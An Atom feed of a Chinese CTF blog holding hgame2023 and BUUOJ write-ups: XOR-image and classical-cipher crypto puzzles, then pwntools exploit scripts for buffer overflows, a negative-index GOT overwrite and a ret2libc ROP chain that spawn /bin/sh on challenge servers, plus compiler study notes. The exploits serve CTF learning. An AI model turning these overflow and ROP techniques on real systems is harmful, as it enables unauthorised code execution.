<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Pa1r0t</title>
  
  <subtitle>re&amp;crypto</subtitle>
  <link href="https://pa1r0t.github.io/atom.xml" rel="self"/>
  
  <link href="https://pa1r0t.github.io/"/>
  <updated>2023-01-14T08:01:30.786Z</updated>
  <id>https://pa1r0t.github.io/</id>
  
  <author>
    <name>Pa1r0t_9e</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>hgame2023</title>
    <link href="https://pa1r0t.github.io/2023/01/14/hgame2023/"/>
    <id>https://pa1r0t.github.io/2023/01/14/hgame2023/</id>
    <published>2023-01-14T02:09:49.000Z</published>
    <updated>2023-01-14T08:01:30.786Z</updated>
    
    <content type="html"><![CDATA[<p>复现hgame</p><h1 id="week1"><a href="#week1" class="headerlink" title="week1"></a>week1</h1><h2 id="crypto"><a href="#crypto" class="headerlink" title="crypto"></a>crypto</h2><h3 id="兔兔的车票"><a href="#兔兔的车票" class="headerlink" title="兔兔的车票"></a>兔兔的车票</h3><p>题目：</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> shuffle, randint, getrandbits</span><br><span class="line"></span><br><span class="line">flagImg = Image.<span class="built_in">open</span>(<span class="string">&#x27;flag.png&#x27;</span>)</span><br><span class="line">width = flagImg.width</span><br><span class="line">height = flagImg.height</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">makeSourceImg</span>():</span><br><span class="line">    colors = long_to_bytes(getrandbits(width * height * <span class="number">24</span>))[::-<span class="number">1</span>]</span><br><span class="line">    <span class="comment">#生成图像吧</span></span><br><span class="line">    img = Image.new(<span class="string">&#x27;RGB&#x27;</span>, (width, height))</span><br><span class="line">    x = <span class="number">0</span></span><br><span class="line">    <span class="comment">#写像素</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(height):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(width):</span><br><span class="line">            img.putpixel((j, i), (colors[x], colors[x + <span class="number">1</span>], colors[x + <span class="number">2</span>]))</span><br><span class="line">            x += <span class="number">3</span></span><br><span class="line">    <span class="keyword">return</span> img</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">xorImg</span>(<span class="params">keyImg, sourceImg</span>):</span><br><span class="line">    <span class="comment"># 生成图片</span></span><br><span class="line">    img = Image.new(<span class="string">&#x27;RGB&#x27;</span>, (width, height)) </span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(height):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(width):</span><br><span class="line">            p1, p2 = keyImg.getpixel((j, i)), sourceImg.getpixel((j, i))</span><br><span class="line">            img.putpixel((j, i), <span class="built_in">tuple</span>([(p1[k] ^ p2[k]) <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>)]))</span><br><span class="line">    <span class="keyword">return</span> img</span><br><span class="line"></span><br><span class="line">n1 = makeSourceImg()</span><br><span class="line">n2 = makeSourceImg()</span><br><span class="line">n3 = makeSourceImg()</span><br><span class="line">nonce = [n1, n2, n3]    <span class="comment">#三张图片</span></span><br><span class="line"></span><br><span class="line">index = <span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">16</span>)) <span class="comment">#生成0~16的序列</span></span><br><span class="line">shuffle(index)  <span class="comment"># 打乱序列</span></span><br><span class="line">e=<span class="number">0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">这里flag.png已经提前被保存在source文件夹下了，文件名也是picture&#123;xx&#125;.png</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> index:</span><br><span class="line">    im = Image.<span class="built_in">open</span>(<span class="string">f&quot;source/picture<span class="subst">&#123;i&#125;</span>.png&quot;</span>)</span><br><span class="line">    key = nonce[randint(<span class="number">0</span>, <span class="number">2</span>)]</span><br><span class="line">    encImg = xorImg(key, im)</span><br><span class="line">    encImg.save(<span class="string">f&#x27;pics/enc<span class="subst">&#123;e&#125;</span>.png&#x27;</span>)</span><br><span class="line">    e+=<span class="number">1</span></span><br></pre></td></tr></table></figure><p>解法：原先我看着只有enc.png,其他啥都没有，怎么个异或？后来也注意到key只有三个，考虑过重复的情况，但是我发现仅有一个enc.png,还是没法搞出原图，后来看了别人的wp，才知道，只要flag.png^picture.png就行，因为它的picture.png原本的就没啥像素，enc.png大部分还是key的像素，所以找到一张存在flag.png的图片，将key异或掉就行，最终虽然得不到真正得flag.png但模糊程度也不高。这里对16张图片笛卡尔积级别异或就行</p><p>最后解密代码：</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> shuffle, randint, getrandbits</span><br><span class="line"></span><br><span class="line">flagImg = Image.<span class="built_in">open</span>(<span class="string">f&#x27;pics/enc<span class="subst">&#123;<span class="number">0</span>&#125;</span>.png&#x27;</span>)</span><br><span class="line">width = flagImg.width</span><br><span class="line">height = flagImg.height</span><br><span class="line">flagImg.close()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">xorImg</span>(<span class="params">keyImg, sourceImg</span>):</span><br><span class="line">    <span class="comment"># 生成图片</span></span><br><span class="line">    img = Image.new(<span class="string">&#x27;RGB&#x27;</span>, (width, height)) </span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(height):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(width):</span><br><span class="line">            p1, p2 = keyImg.getpixel((j, i)), sourceImg.getpixel((j, i))</span><br><span class="line">            img.putpixel((j, i), <span class="built_in">tuple</span>([(p1[k] ^ p2[k]) <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>)]))</span><br><span class="line">    <span class="keyword">return</span> img</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">        imi = Image.<span class="built_in">open</span>(<span class="string">f&quot;pics/enc<span class="subst">&#123;i&#125;</span>.png&quot;</span>)</span><br><span class="line">        imj = Image.<span class="built_in">open</span>(<span class="string">f&quot;pics/enc<span class="subst">&#123;j&#125;</span>.png&quot;</span>)</span><br><span class="line">        xorimg = xorImg(imj, imi)</span><br><span class="line">        xorimg.save(<span class="string">f&#x27;source/xor<span class="subst">&#123;i*<span class="number">16</span>+j&#125;</span>.png&#x27;</span>)</span><br><span class="line">        imi.close()</span><br><span class="line">        imj.close()</span><br></pre></td></tr></table></figure><p>最后获得模糊的flag图片：</p><p><img src="/./../images/xor246.png" alt="xor246"></p><h3 id="神秘的电话"><a href="#神秘的电话" class="headerlink" title="神秘的电话"></a>神秘的电话</h3><p>题目：</p><p>一个疑似base64编码的txt文件</p><p>一个播放起来是一个摩斯密码的wav文件</p><p>解法：</p><ol><li><p>提取出声音文件的信息：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">morse2ascii morse.wav</span><br></pre></td></tr></table></figure><p><img src="/./../images/image-20230114103532078.png" alt="image-20230114103532078"></p></li><li><p>base64解码：</p></li></ol><p><img src="/./../images/image-20230114103642721.png" alt="image-20230114103642721"></p><p>篱笆一一&gt;栅栏密码；倒着一一&gt;逆序；密匙一一&gt;维吉尼亚密码;北欧神话一一&gt;vidar</p><p>（这里用morse2ascii计算出的数据多了一些下划线，做法是每一处下划线都去掉一个就行）</p><p>最后flag:</p><p><img src="/./../images/image-20230114104040525.png" alt="image-20230114104040525"></p><h2 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h2><h3 id="easy-overflow"><a href="#easy-overflow" class="headerlink" title="easy_overflow"></a>easy_overflow</h3><p>他妈的，这道死活搞不出来，看了wp才知道是close函数关闭了标准输出通道。需要在来个报错输出，把结果输出过来</p><p>题目没啥好讲的，直接上exp</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io = process(<span class="string">&#x27;./vuln&#x27;</span>)</span><br><span class="line"><span class="comment"># io = remote(&quot;week-1.hgame.lwsec.cn&quot;,31267)</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./vuln&#x27;</span>)</span><br><span class="line"><span class="comment"># main_addr = elf.sym[&#x27;main&#x27;]</span></span><br><span class="line">back_addr = elf.sym[<span class="string">&#x27;b4ckd0or&#x27;</span>]</span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span>*<span class="number">16</span> + p64(<span class="number">0</span>) + p64(back_addr)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>运用1&gt;&amp;2将结果从报错信息中输出</p><p><img src="/./../images/image-20230114110109416.png" alt="image-20230114110109416"></p><h3 id="choose-the-seat"><a href="#choose-the-seat" class="headerlink" title="choose_the_seat"></a>choose_the_seat</h3><p>**HINTS:**数组下标的检查好像少了点东西</p><p>下标v0没有检查下界</p><p><img src="/./../images/image-20230114151906912.png" alt="image-20230114151906912"></p><p>seats在bss段，并只有seats写入。无法进行栈操作<img src="/./../images/image-20230114152100537.png" alt="image-20230114152100537"></p><p>思路：运用负下标进行got表覆盖，用got表泄漏libc的地址</p><ol><li>先用vuln函数覆盖exit的地址，防止程序退出，方便下次再次利用</li><li>再用setbuf的plt表进行泄漏got地址，再用指定的libc计算基地址</li><li>用基地址计算system的地址，再用system的地址覆盖puts的地址，puts地址的旁边正好可以存放binsh的地方，连着binsh一起覆盖了</li></ol><p>exp：</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># io = process(&#x27;./vuln&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;week-1.hgame.lwsec.cn&#x27;</span>,<span class="number">31940</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./vuln&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.31.so&#x27;</span>)</span><br><span class="line">vuln_addr = elf.sym[<span class="string">&#x27;vuln&#x27;</span>]</span><br><span class="line">sys_libc = libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line">libc_setbuf_addr = libc.sym[<span class="string">&#x27;setbuf&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;setbuf:&#x27;</span>,<span class="built_in">hex</span>(libc_setbuf_addr))</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;one.&#x27;</span>,<span class="built_in">str</span>(-<span class="number">6</span>))</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;your name&#x27;</span>,p64(vuln_addr))</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;one.&#x27;</span>,<span class="built_in">str</span>(-<span class="number">8</span>))</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;your name&#x27;</span>,<span class="string">b&#x27;A&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">b&#x27;name is &#x27;</span>)</span><br><span class="line">res_addr = u64(io.recvuntil(<span class="string">&#x27;Your seat&#x27;</span>).split(<span class="string">b&#x27;\nYour&#x27;</span>)[<span class="number">0</span>].ljust(<span class="number">8</span>,<span class="string">b&#x27;\0&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;addr:&#x27;</span>,<span class="built_in">hex</span>(res_addr))</span><br><span class="line">base_addr = res_addr - <span class="number">0x8ba41</span></span><br><span class="line">sys_addr = base_addr + sys_libc</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;one.&#x27;</span>,<span class="built_in">str</span>(-<span class="number">9</span>))</span><br><span class="line">payload = <span class="string">b&#x27;/bin/sh\x00&#x27;</span> + p64(sys_addr)</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;your name&#x27;</span>,payload)</span><br><span class="line">io.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这里在覆盖setbuf的地址时会写一个字母，字母所占位置不超过0x1000，因为一个内存页就是0x1000，所以无论基地址如何变，函数在内存页中的偏移地址不变，所以我们写一个字母也只是占用了偏移位置，对计算基地址并不会影响，所以我们查看指定libc中的setbuf（静态），将得到的setbuf的地址的偏移数值和我们泄漏出的偏移数值改成相同，再减去我们泄漏出的总值就能得到base_addr</p><p>下面把d0换成41就行，41就是我们写进去的’A’</p><p><img src="/./../images/image-20230114153844803.png" alt="image-20230114153844803"></p><p>如何这里减去总值：</p><p><img src="/./../images/image-20230114153925669.png" alt="image-20230114153925669"></p><p>binsh的地址正好是下标0x10的整数倍，然后后面就是puts的地址，可以说出题人别有用心了</p><p><img src="/./../images/image-20230114153109502.png" alt="image-20230114153109502"></p><p>（PIE全称是position-independent executable，中文解释为地址无关可执行文件，该技术是一个针对代码段（.text）、数据段（.data）、未初始化全局变量段（.bss）等固定地址的一个防护技术，如果程序开启了PIE保护的话，在每次加载程序时都变换加载地址，从而不能通过ROPgadget等一些工具来帮助解题。解法：内存是以页载入机制，如果开启PIE保护的话，只能影响到单个内存页，一个内存页大小为0x1000，那么就意味着不管地址怎么变，某一条指令的后三位十六进制数的地址是始终不变的。因此我们可以通过覆盖地址的后几位来可以控制程序的流程）</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;复现hgame&lt;/p&gt;
&lt;h1 id=&quot;week1&quot;&gt;&lt;a href=&quot;#week1&quot; class=&quot;headerlink&quot; title=&quot;week1&quot;&gt;&lt;/a&gt;week1&lt;/h1&gt;&lt;h2 id=&quot;crypto&quot;&gt;&lt;a href=&quot;#crypto&quot; class=&quot;heade</summary>
      
    
    
    
    <category term="ctf" scheme="https://pa1r0t.github.io/categories/ctf/"/>
    
    
  </entry>
  
  <entry>
    <title>pwn_practice1</title>
    <link href="https://pa1r0t.github.io/2023/01/13/pwn-practice1/"/>
    <id>https://pa1r0t.github.io/2023/01/13/pwn-practice1/</id>
    <published>2023-01-13T03:50:36.000Z</published>
    <updated>2023-01-13T12:33:23.186Z</updated>
    
    <content type="html"><![CDATA[<p>pwn</p><span id="more"></span><h2 id="hgame2018-flag-server"><a href="#hgame2018-flag-server" class="headerlink" title="hgame2018_flag_server"></a>hgame2018_flag_server</h2><h3 id="开启docker"><a href="#开启docker" class="headerlink" title="开启docker"></a>开启docker</h3><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker <span class="keyword">run</span><span class="language-bash"> -v <span class="string">&quot;<span class="subst">$(pwd)</span>:/ctf/work&quot;</span> -i -t skysider/pwndocker /bin/bash</span></span><br></pre></td></tr></table></figure><p><img src="/./../images/image-20230113115308826.png" alt="image-20230113115308826"></p><h3 id="程序核心逻辑"><a href="#程序核心逻辑" class="headerlink" title="程序核心逻辑"></a>程序核心逻辑</h3><p>这里有个随机值，输入的值和随机值比较</p><p><img src="/./../images/image-20230113115524208.png" alt="image-20230113115524208"></p><p>我准备用逆向的守法，来搞它，写了个cpp，结果运行多次结果都不一样</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;time.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;random&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">void</span>)</span></span>&#123;</span><br><span class="line"><span class="type">unsigned</span>  <span class="type">int</span> v3 = <span class="built_in">time</span>(<span class="number">0</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,v3);</span><br><span class="line"><span class="built_in">srand</span>(v3);</span><br><span class="line"><span class="type">int</span> v8 = <span class="built_in">rand</span>();</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%u&quot;</span>,v8);</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>giao~~~~~</p><p>然后我只能老老实实找漏洞了</p><p>先是发现可以读取字符串name<img src="/./../images/image-20230113115909861.png" alt="image-20230113115909861"></p><p>找到读取字符串的函数是自己编的<img src="/./../images/image-20230113115811014.png" alt="image-20230113115811014"></p><p>最后v10进行检验<img src="/./../images/image-20230113115933550.png" alt="image-20230113115933550"></p><p>这里看栈分布<img src="/./../images/image-20230113120005292.png" alt="image-20230113120005292"></p><p>直接在s1的下面，直接填充’A’*((0x50-0x10)+size(int))</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">28388</span>)</span><br><span class="line"><span class="comment"># io = process(&#x27;./flag_server&#x27;)</span></span><br><span class="line">io.sendlineafter(<span class="string">&#x27;your username length: &#x27;</span>,<span class="string">b&#x27;-1&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">b&#x27;A&#x27;</span>*<span class="number">0x44</span>)</span><br><span class="line">io.interactive()</span><br><span class="line">io.close()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h3><p><img src="/./../images/image-20230113120243209.png" alt="image-20230113120243209"></p><hr><h2 id="ciscn-2019-c-1"><a href="#ciscn-2019-c-1" class="headerlink" title="ciscn_2019_c_1"></a>ciscn_2019_c_1</h2><h3 id="核心程序"><a href="#核心程序" class="headerlink" title="核心程序"></a>核心程序</h3><p><img src="/./../images/image-20230113201822956.png" alt="image-20230113201822956"></p><p><strong>利用点</strong>：利用gets，去覆盖栈中的内容，利用rop链泄漏puts函数在内存中的地址，然后通过这个地址去找对应版本的libc，找到内存中system的地址和bin_sh字符串的地址，再利用一次rop链执行system函数即可</p><p>这里有一个模块叫LibcSearcher，它可以让使用者不用担心本地和远程的libc是否统一，它可以帮你去寻找正在执行的libc。非常好用</p><h3 id="寻找rop"><a href="#寻找rop" class="headerlink" title="寻找rop"></a>寻找rop</h3><p>目的：寻找pop rdi ret;指令，因为该文件是64位，而64位文件采用寄存器存放参数，第一个参数存放的寄存器就是rdi</p><p>命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary ./ciscn_2019_c_1 --only <span class="string">&#x27;pop|ret&#x27;</span></span><br></pre></td></tr></table></figure><p>结果：</p><p><img src="/./../images/image-20230113202715207.png" alt="image-20230113202715207"></p><h3 id="脚本："><a href="#脚本：" class="headerlink" title="脚本："></a>脚本：</h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># io = process(&#x27;./ciscn_2019_c_1&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">26320</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;ciscn_2019_c_1&#x27;</span>)</span><br><span class="line"><span class="comment">#</span></span><br><span class="line">encrypt_addr = elf.sym[<span class="string">&#x27;encrypt&#x27;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]<span class="comment"># 用于打印puts的地址</span></span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]<span class="comment"># puts函数地址</span></span><br><span class="line">rdi_ret = <span class="number">0x400c83</span></span><br><span class="line"><span class="comment"># puts函数的参数puts函数的地址puts函数执行完的返回地址，用于下一次的shellcode</span></span><br><span class="line">payload1 = <span class="string">b&#x27;A&#x27;</span> * <span class="number">0x50</span> + p64(<span class="number">0</span>) + p64(rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(encrypt_addr)</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;Input your choice!&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;Input your Plaintext to be encrypted&#x27;</span>,payload1)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;Ciphertext\n&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line"><span class="comment"># 拿到puts在内存中的地址</span></span><br><span class="line">puts_addr = u64(io.recvline().strip().ljust(<span class="number">8</span>,<span class="string">b&#x27;\0&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;addr:&#x27;</span>,<span class="built_in">hex</span>(puts_addr))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 找内存libc的地址</span></span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;puts&#x27;</span>,puts_addr)</span><br><span class="line"></span><br><span class="line">addr_base = puts_addr - libc.dump(<span class="string">&quot;puts&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;libc&#x27;</span>,addr_base)</span><br><span class="line">sys_addr = libc.dump(<span class="string">&#x27;system&#x27;</span>) + addr_base</span><br><span class="line">binsh_addr = libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>) + addr_base</span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">b&#x27;A&#x27;</span> * <span class="number">0x50</span> + p64(<span class="number">0</span>) + p64(rdi_ret) + p64(binsh_addr) + p64(sys_addr) + p64(encrypt_addr)</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;Input your Plaintext to be encrypted&#x27;</span>,payload2)</span><br><span class="line">io.interactive()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="结果："><a href="#结果：" class="headerlink" title="结果："></a>结果：</h3><p><img src="/./../images/image-20230113203306010.png" alt="image-20230113203306010"></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;pwn&lt;/p&gt;</summary>
    
    
    
    <category term="ctf" scheme="https://pa1r0t.github.io/categories/ctf/"/>
    
    
  </entry>
  
  <entry>
    <title>编译2</title>
    <link href="https://pa1r0t.github.io/2023/01/12/%E7%BC%96%E8%AF%91%E5%81%8F2/"/>
    <id>https://pa1r0t.github.io/2023/01/12/%E7%BC%96%E8%AF%91%E5%81%8F2/</id>
    <published>2023-01-12T14:07:41.000Z</published>
    <updated>2023-01-12T14:29:00.718Z</updated>
    
    <content type="html"><![CDATA[<p>高级语言描述</p><span id="more"></span><h3 id="编译基础知识"><a href="#编译基础知识" class="headerlink" title="编译基础知识"></a>编译基础知识</h3><ol><li>高级语言：程序语言是一个记号系统</li><li>语法<ul><li>语法使得这串字符形成一个形式上正确的程序。</li><li>语法＝词法规则＋语法规则</li><li>例如：<ul><li>0.5*x1+c *</li><li>0.5、x1、c、+是语言的单词符号 </li><li>0.5*x1+c是语言的语法单位</li></ul></li><li>语法单位：表达式、子句、语句、函数、过程、程序</li><li>语言的词法规则和语法规则定义了程序的形 式结构，是判断输入字符串是否构成一个形 式上正确的程序的依据。</li></ul></li><li>语义</li></ol><h3 id="字母表和符号表"><a href="#字母表和符号表" class="headerlink" title="字母表和符号表"></a>字母表和符号表</h3><p>一些概念：</p><ol><li><p>字母表：是符号的非空有穷集合，是符号的非空有穷集合</p></li><li><p>符号串：顾名思义。空串：不含有任何符号的串称作空串，记作ε</p></li><li><p>句子：字母表上符合某种规则构成的串。串就是句子</p><p>（注：约定用a,b,c…表示符号；用α,β,γ…表示符号串； 用A,B,C…表示其集合）</p></li></ol><p>符号串集合的运算：</p><p><img src="/./../images/image-20230112222858340.png" alt="image-20230112222858340"></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;高级语言描述&lt;/p&gt;</summary>
    
    
    
    <category term="re" scheme="https://pa1r0t.github.io/categories/re/"/>
    
    
  </entry>
  
  <entry>
    <title>csapp1</title>
    <link href="https://pa1r0t.github.io/2023/01/09/csapp1/"/>
    <id>https://pa1r0t.github.io/2023/01/09/csapp1/</id>
    <published>2023-01-09T06:30:39.000Z</published>
    <updated>2023-01-10T01:53:47.447Z</updated>
    
